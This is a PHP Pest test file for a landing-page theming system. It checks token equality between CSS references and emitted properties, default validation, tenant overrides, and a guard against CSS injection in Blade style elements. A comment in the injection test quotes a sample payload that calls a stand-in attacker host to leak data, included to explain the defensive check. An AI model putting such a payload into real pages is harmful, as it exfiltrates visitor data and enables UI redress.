<?php

declare(strict_types=1);

use App\Domain\Landing\LandingTemplate;
use App\Domain\Landing\ThemeTokens;
use App\Features\Landing\ThemeDefaults;
use Tests\Support\LandingPages;

/*
 * ================================================================================
 * `QRPAGER-46`'s STATED INVARIANT, CLAUSE 1 — THE TWO SETS ARE EQUAL
 * ================================================================================
 *
 * Muhammad's words: *"For each of rail, ember and tile: the set of tokens the template
 * references and the set the resolver emits are EQUAL — no reference with nothing behind it,
 * no emitted property nothing reads."*
 *
 * ⚠ BOTH SETS ARE READ OUT OF THE RENDERED PAGE, which is the only subject that cannot
 * disagree with what a visitor receives. The references come from the `var()` calls in the
 * served `<style>` block; the emitted properties come from the `style` attribute on `<html>`,
 * which `ThemeTokenTest` separately proves is the ONLY place a theme reaches the document.
 * Neither side is a list in this file, and that is the point: a list here would be a third
 * source, and the two it was meant to check would be free to drift from it together.
 *
 * ⚠ WHY THE CLAUSE IS WORTH A TEST AT ALL. The three new arrangements carry **no `var()`
 * fallback literal** — `R-268` is what a fallback costs — so a reference the resolver does
 * not emit paints NOTHING. Not a wrong colour: no colour. That failure is invisible to every
 * test that reads markup, and it is one typo away at any time.
 *
 * ⚠ AND THE CLAUSE USED TO BE SCOPED TO THREE OF FIVE, WHICH `QRPAGER-47` MADE ALL OF THEM.
 * `classic` and `editorial` emitted only what the tenant set, because `classic` had to
 * reproduce `pre-template-page.html` byte for byte and relied on the fallbacks
 * `tools/design-tokens/landing-baseline.json` freezes. Both are retired, so the equality now
 * holds over `cases()` with no exclusion — and the case that proved the scope was real is
 * retired with them rather than left asserting a set that cannot be built.
 */

/*
 * ⚠ `LandingPages::render()` AND THE TWO READERS BELOW USED TO LIVE IN THIS FILE, which is the
 * `§11` QA round's L-3: `TemplateStructureTest` called them, and Pest loads a whole directory
 * for `--filter`, so both files passed that way and in the full suite while
 * `php artisan test tests/Feature/Landing/TemplateStructureTest.php` — how a single failing
 * file is normally re-run — died with *"Call to undefined function LandingPages::render()"*. They
 * are in `Tests\Support\LandingPages` now.
 */

/**
 * Every custom property the page's own rules READ, as a sorted list.
 *
 * ⚠ THE NAME IS WHAT IS COLLECTED, NOT THE WHOLE CALL, so `var(--color-surface,#f6f6f6)` and
 * `var(--color-surface)` are the same reference — which they are: a fallback changes what
 * renders when the token is absent, never which token is read.
 *
 * ⚠ AND THE FALLBACK ITSELF IS NOT THIS FILE'S SUBJECT — it belongs to the token scanner's
 * `no-var-fallback` rule and to `tools/design-tokens/landing-baseline.json`'s freeze. This
 * sentence cited a test class that did not exist until the `§11` QA round's M-6 found it,
 * which is the `R-136` shape in the one directory `RepoGuardTest`'s citation walk could not
 * see — `tests/` was outside it, and now is not.
 *
 * @return list<string>
 */
function referencedTokens(string $html): array
{
    $style = LandingPages::styleBlock($html);

    expect($style)->not->toBe('', 'the rendered page serves no <style> block at all');

    $found = [];
    preg_match_all('/var\(\s*(--[a-z0-9-]+)/i', $style, $found);

    /** @var list<string> $names */
    $names = array_values(array_unique($found[1]));
    sort($names);

    return $names;
}

/**
 * Every custom property the page's `style` attribute SETS, as a sorted list.
 *
 * @return list<string>
 */
function emittedProperties(string $html): array
{
    $names = array_keys(LandingPages::rootProperties($html));
    sort($names);

    return $names;
}

it('throws rather than rendering a page with one property missing, when the token layer drifts', function (): void {
    /*
     * ⚠ THE `§11` QA ROUND'S M-5: these two are the only failure branches this ticket adds,
     * `§6`'s question 6 is answered *"there is nothing to retry"*, and `ThemeDefaults`' own
     * docblock argues that a loud failure is the honest outcome of a drifted token layer — and
     * nothing drove either. `config([…])` makes it two cases.
     *
     * What the throw protects: the three new arrangements carry NO `var()` fallback, so a
     * missing default is a property no rule can read — a page that renders with one colour
     * silently absent. `LandingPages::publish()` reaches this in its phase 2, which holds no
     * transaction and precedes the row update, so the publish aborts rather than writing a
     * page nobody can see.
     */
    config(['design-tokens.colours.light.paper' => null]);

    expect(static fn () => ThemeDefaults::values())
        ->toThrow(RuntimeException::class, 'config/design-tokens.php carries no string at colours.light.paper');
});

it('throws for a font stack the contract does not have, which is the other drift', function (): void {
    /*
     * ⚠ THROUGH REFLECTION, AND SAYING WHY IS PART OF THE CASE. `DEFAULT_SOURCES` is a
     * `const` — deliberately, because `composer guard` rule 11c requires the token names to
     * live in exactly one file — so a `stack.*` source that is not in `STACKS` cannot be
     * reached by configuration. The branch exists for a token layer that drops a stack, and a
     * guard nothing drives is the thing this project keeps finding; so the private resolver is
     * driven directly rather than left as an argument in a docblock.
     */
    $read = new ReflectionMethod(ThemeDefaults::class, 'read');

    expect(static fn () => $read->invoke(null, 'stack.handwriting'))
        ->toThrow(RuntimeException::class, 'the font stack handwriting is not in ThemeTokens::STACKS');

    // The positive control: the stack the map actually names resolves to its KEY, not a stack.
    expect($read->invoke(null, 'stack.system'))->toBe('system');
});

it('puts no Blade echo and no PHP inside the page’s style element, which is where CSS injection would live', function (): void {
    /*
     * ⚠ THE `§11` SECURITY ROUND'S M-3, AS A MECHANISM RATHER THAN A PROMISE IN PROSE.
     * `{{ }}` is the WRONG encoder inside `<style>`: `e()` escapes `& < > " '` and leaves
     * `{ } ( ) : /` alone, so a value echoed into a style body permits CSS injection —
     * `}body{background:url(https://attacker/?leak)}` is exfiltration by request plus UI
     * redress — even though a `</style>` breakout is blocked. D5 forbids `{!! !!}` anywhere in
     * these views and `RepoGuardTest` walks every view for it; nothing forbade `{{ }}` INSIDE
     * a style element, and the Blade CSS reader this ticket added is specified to blank it.
     *
     * So the page this ticket writes CSS into is held to the stronger property: its style
     * element contains no echo of either kind and no `@php`. The general rule — a
     * `blade-echo-in-style` finding over every template, with `errors/panel-problem.blade.php`
     * either converted or baselined — is `§5`'s, with an owner and a date.
     */
    $style = LandingPages::styleBlock(LandingPages::render('rail'));

    expect($style)->not->toBe('');

    $source = (string) file_get_contents(resource_path('views/landing/page.blade.php'));

    /*
     * ⚠ BLADE COMMENTS GO FIRST, AND THE ELEMENT IS EXTRACTED FROM WHAT IS LEFT — THE THIRD
     * TIME THIS HAZARD HAS APPEARED IN ONE TICKET. The first version of this case extracted
     * `<style>(.*?)</style>` from the raw source and the match stopped at the `</style>`
     * QUOTED INSIDE that element's own comment (*"⚠ NO NEWLINE BEFORE `</style>`"*), so the
     * `$css` it checked was a truncated fragment ending mid-comment — with an unterminated
     * `{{--` and a quoted `{!!` in it, which it then reported as findings. `maskBladeCss()`
     * encodes the same ordering for the same reason, and its own fixture carries both quoted
     * tags. Prose about a hazard is not the hazard.
     */
    $withoutComments = (string) preg_replace('/\{\{--.*?--\}\}/s', '', $source);

    $block = [];

    preg_match('/<style>(.*?)<\/style>/s', $withoutComments, $block);

    $withoutComments = $block[1] ?? '';

    expect($withoutComments)->not->toBe('', 'the template carries no <style> element to check');

    foreach (['{{' => 'a Blade echo', '{!!' => 'a raw Blade echo', '@php' => 'a PHP block'] as $needle => $what) {
        expect(str_contains($withoutComments, $needle))->toBeFalse(
            "page.blade.php's <style> element contains {$what} ({$needle}). A value echoed into a "
            .'style body is CSS injection waiting for a tenant string: e() leaves { } ( ) : / '
            .'alone. The rules in that element are literal text and must stay so.'
        );
    }
});

it('emits exactly the tokens it references, for every arrangement there is', function (): void {
    $driven = 0;

    foreach (LandingTemplate::cases() as $template) {
        $html = LandingPages::render($template->value);

        $referenced = referencedTokens($html);
        $emitted = emittedProperties($html);

        // Not vacuous: a page that referenced nothing would pass an equality of two empty
        // lists, and twelve is what the contract carries.
        expect($referenced)->toHaveCount(
            count(ThemeTokens::NAMES),
            $template->value.' reads a different number of tokens than the contract has, so one '
            .'of the two sets below is not the set this invariant is about'
        );

        expect($emitted)->toBe(
            $referenced,
            $template->value.': the tokens its rules READ and the properties the resolver SETS '
            .'are not the same set. A reference with nothing behind it paints nothing at all, '
            .'because these arrangements carry no var() fallback — and an emitted property '
            .'nothing reads is a value the owner can change with no effect. Referenced: '
            .implode(' ', $referenced).' · emitted: '.implode(' ', $emitted)
        );

        $driven++;
    }

    expect($driven)->toBe(
        count(LandingTemplate::cases()),
        'an arrangement was skipped, so this case proves less than its name claims'
    )->and($driven)->toBeGreaterThan(2, 'the enum has shrunk below the three arrangements the product offers');
});

it('lets the tenant win every token they set, and fills only the rest', function (): void {
    /*
     * ⚠ THE HALF AN EQUALITY CANNOT SEE. Filling every absent token would satisfy the case
     * above even if it OVERWROTE the tenant's own values — the set would still be equal and
     * the restaurant's colours would be gone. Measured on the value, not on the set.
     */
    $html = LandingPages::render('rail', ['color.accent' => '#7d2b8f']);

    $root = [];
    preg_match('/<html[^>]*\sstyle="([^"]*)"/', $html, $root);

    expect($root[1] ?? '')->toContain('--color-accent:#7d2b8f')
        ->and($root[1])->toContain('--color-background:'.ThemeDefaults::values()['color.background'])
        ->and(emittedProperties($html))->toHaveCount(count(ThemeTokens::NAMES));
});

it('gives every default a value the contract itself accepts, from the generated token layer', function (): void {
    $defaults = ThemeDefaults::values();

    // The key sets are equal, so no token is left without a default and no default names a
    // token the contract does not have.
    expect(array_keys($defaults))->toBe(array_keys(ThemeTokens::NAMES));

    foreach ($defaults as $name => $value) {
        /*
         * ⚠ THROUGH `accepts()`, THE SAME GATE A TENANT'S VALUE PASSES. A default that was
         * emitted without being validated could carry an upper-case hex, a font stack where
         * a stack KEY belongs, or a length with no unit — and the only thing that would say
         * so is a visitor looking at a broken page. `accepts()` takes lower-case hex only,
         * which is why `ThemeDefaults` lower-cases what the token layer writes.
         */
        expect(ThemeTokens::accepts($name, $value))->toBeTrue(
            "the default for {$name} is {$value}, which the contract refuses"
        );
    }

    /*
     * ⚠ ALL TWELVE PAIRS, AND IT WAS TWO SPOT CHECKS — the `§11` security round's L-2. Every
     * path resolving and every value being accepted are asserted above, so a RENAMED role in
     * `packages/tokens` fails loudly; what nothing named was which role each token points AT,
     * so a re-pointing — `color.accent` moved from `brand` to `signal`, say — would have
     * changed every default page in the product with no test saying so.
     *
     * Read out of `ThemeTokens::DEFAULT_SOURCES` rather than copied here: this asserts that
     * the map and the token layer agree, not that the map says what this file says.
     */
    foreach (ThemeTokens::DEFAULT_SOURCES as $name => $source) {
        if (str_starts_with($source, 'stack.')) {
            $stack = substr($source, strlen('stack.'));

            expect(ThemeTokens::STACKS)->toHaveKey($stack);
            expect($defaults[$name])->toBe($stack, "the default for {$name} is not the stack key {$stack}");

            continue;
        }

        /** @var string $value */
        $value = config('design-tokens.'.$source);

        expect($defaults[$name])->toBe(
            strtolower($value),
            "the default for {$name} is not what config/design-tokens.php holds at {$source}"
        );
    }
});

it('fills only tokens the contract knows, whoever calls it', function (): void {
    /*
     * The `§11` security round's L-1. `fill()` is public and used to be `array_replace()`
     * alone, so it returned any key the caller held: the round measured a thirteen-key map
     * carrying `ready.field` — one of the three properties decision D4 keeps OUTSIDE theming,
     * which no tenant value may ever produce. Nothing escaped, because `declarations()`
     * re-asks `accepts()`; this is the control at the place that promises it.
     */
    $filled = ThemeDefaults::fill([
        'color.accent' => '#7d2b8f',
        'ready.field' => '#000000',
        'not.a.token' => 'anything',
    ]);

    expect(array_keys($filled))->toBe(array_keys(ThemeTokens::NAMES))
        ->and($filled['color.accent'])->toBe('#7d2b8f', 'the tenant’s own value did not win');

    // And the whole way through: the emitted attribute carries neither key.
    $emitted = emittedProperties(LandingPages::render('rail', ['color.accent' => '#7d2b8f']));

    expect($emitted)->not->toContain('--ready-field')
        ->and($emitted)->toHaveCount(count(ThemeTokens::NAMES));
});
